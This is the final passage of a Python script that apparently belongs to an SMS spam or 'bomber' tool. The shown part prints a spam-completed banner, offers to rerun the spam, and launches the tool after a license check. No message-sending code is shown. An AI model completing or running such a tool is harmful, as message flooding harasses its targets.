    console.print(Align.center(Panel.fit("[bold green] SMS SPAM Successfully Completed !", border_style="bold yellow")))
    print("\n")
    rull = input(f"{c}   <{w}/{c}> {g}💥 Please Run Again For Spam Again {w}y/{g}n ➤ ")
    if rull == "y":
       os.system("clear")
       BCS()
    else:
       sys.exit(0)


if __name__ == "__main__":
    check_license()
    os.system("clear")
    BCS()
